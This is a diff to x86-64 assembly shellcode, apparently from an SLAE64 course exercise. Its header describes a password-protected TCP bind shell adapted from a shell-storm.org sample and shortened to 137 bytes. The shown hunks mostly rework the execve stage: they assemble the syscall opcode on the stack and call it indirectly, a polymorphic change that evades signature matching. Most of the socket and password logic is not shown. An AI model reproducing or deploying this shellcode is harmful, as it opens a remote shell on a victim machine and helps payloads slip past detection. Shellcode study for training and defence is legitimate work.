@@ -1,3 +1,9 @@
+;Original Shellcode : http://shell-storm.org/shellcode/files/shellcode-870.php
+;Bind_shell_TCP with password
+;modified by Sathish Kumar L SLAE64 - 1408
+;original lenght = 175 bytes
+;modified length = 137 bytes
+
 global _start
 
 _start:
@@ -6,7 +12,7 @@ _start:
 	xor rsi, rsi 
 	mul rsi
 	add rcx, 0x3       
-	push byte 0x2   ;pusing argument to the stack
+	push byte 0x2   ; pusing argument to the stack
 	pop rdi         ; poping the argument to the rdi instructions on the top of the stack should be remove first because stack LIFO
 	inc esi         ; already rsi is 0 so incrementing the rsi register will make it 1
 	push byte 0x29  ; pushing the syscall number into the rax by using stack
@@ -95,6 +101,11 @@ password_check:
 	
 execve:                                      
     xor esi, esi
+    xor r15, r15
+    mov r15w, 0x161f
+    sub r15w, 0x1110
+    push r15
+    mov r15, rsp
     mov rdi, 0xff978cd091969dd0
     inc rdi
     neg rdi
@@ -102,6 +113,6 @@ execve:
     add al, 0x3b
     push rdi
     push rsp
-    pop r10
-    mov rdi, r10
-    syscall
+    pop rdi
+    call r15
+
